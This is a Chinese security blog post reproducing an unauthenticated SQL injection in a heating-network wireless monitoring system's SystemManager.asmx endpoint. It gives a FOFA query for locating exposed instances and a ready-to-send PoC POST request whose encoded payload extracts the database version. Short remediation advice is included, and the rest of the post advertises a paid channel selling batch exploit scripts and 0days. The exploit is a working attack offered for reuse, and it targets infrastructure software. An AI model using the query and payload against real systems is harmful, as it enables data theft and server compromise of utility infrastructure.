#  「漏洞复现」热网无线监测系统 SystemManager.asmx SQL注入漏洞   
冷漠安全  冷漠安全   2024-07-03 19:49  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
热网无线监测系统是一种先进的热力管网监测解决方案，它通过无线通信技术实现对热力管网各项参数的实时监测和数据分析，以提高供热效率、降低能耗、保障管网安全。系统利用先进的传感器技术和无线通信技术，对热力管网中的温度、压力、流量等关键参数进行实时监测，并将数据传输至监控中心进行集中处理和分析。该系统能够及时发现管网中的异常情况，为供热管理提供决策支持，实现供热系统的智能化、精细化管理。  
  
0x03  
  
**漏洞威胁**  
  
热网无线监测系统 SystemManager.asmx 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0olN74ZoLZ4trYW9JgqVQr0Bfa10lP9HTZmnP70Z2DlQNia2wO7knmcbwQNO0eAdFb67Z8A03TUWnQ/640?wx_fmt=png&from=appmsg "")  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
POST /DataSrvs/SystemManager.asmx/UpdateWUT HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Connection: close

id=%28SELECT+CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28CASE+WHEN+%281675%3D1675%29+THEN+@@version+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28113%29%29&name=&desc=
```  
  
查询数据库版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0olN74ZoLZ4trYW9JgqVQr0apehfxtdbBruFRoaY5uian6plFpDI3rWqQlnquMuMkJ6xRdMqqNiaV4w/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0olN74ZoLZ4trYW9JgqVQr0D3CQMzWfXg0ibCJmWyxdI4ia9lcqmxZrQOsCDaVbaOODGGHVD4z5sWpA/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0olN74ZoLZ4trYW9JgqVQr0C2wgNAJ5xAxd4Kt77V30FFSvl9oxaa9Pf85AuzYs2x9MkYZzXc9icvA/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0olN74ZoLZ4trYW9JgqVQr0tknBCibAPyZGibiaOic6LohnSKG29FPgbeJ2eTYheGbwpGBO5LQZ2d2Qew/640?wx_fmt=gif&from=appmsg "")  
  
